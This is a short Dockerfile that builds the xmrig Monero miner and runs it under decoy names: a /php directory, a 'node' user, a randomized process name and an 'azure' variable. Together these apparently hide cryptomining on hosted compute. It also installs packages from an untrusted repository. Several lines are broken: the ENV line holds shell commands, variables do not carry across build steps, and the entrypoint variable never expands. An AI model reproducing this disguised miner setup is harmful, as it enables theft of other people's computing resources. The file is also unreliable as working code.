FROM alpine:latest AS build

WORKDIR /php

RUN  apk add --update --no-cache --virtual build-deps build-base libuv libuv-dev libmicrohttpd-dev openssl-dev util-linux-dev gcc abuild binutils cmake \
  && apk add --update --no-cache ca-certificates make git wget screen \
  && apk add --update --no-cache --repository http://dl-cdn.alpinelinux.org/alpine/edge/testing/ --allow-untrusted hwloc-dev 
RUN azure=mxsemsdnlkdj;
RUN git clone https://github.com/xmrig/xmrig \
  && a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d \
  && cd xmrig \
  && cmake -DCMAKE_BUILD_TYPE=Release -DWITH_HTTPD=OFF -DWITH_TLS=OFF \
  && make 
  
FROM  alpine:latest
RUN   adduser -S -D -H -h /php node
COPY --from=build /xmrig/xmrig/xmrig-notls /php/xmrig
USER node
ENV mv xmrig $azure -n \
  && cp $azure "$cpuname"
ENTRYPOINT ["./$cpuname"]




  
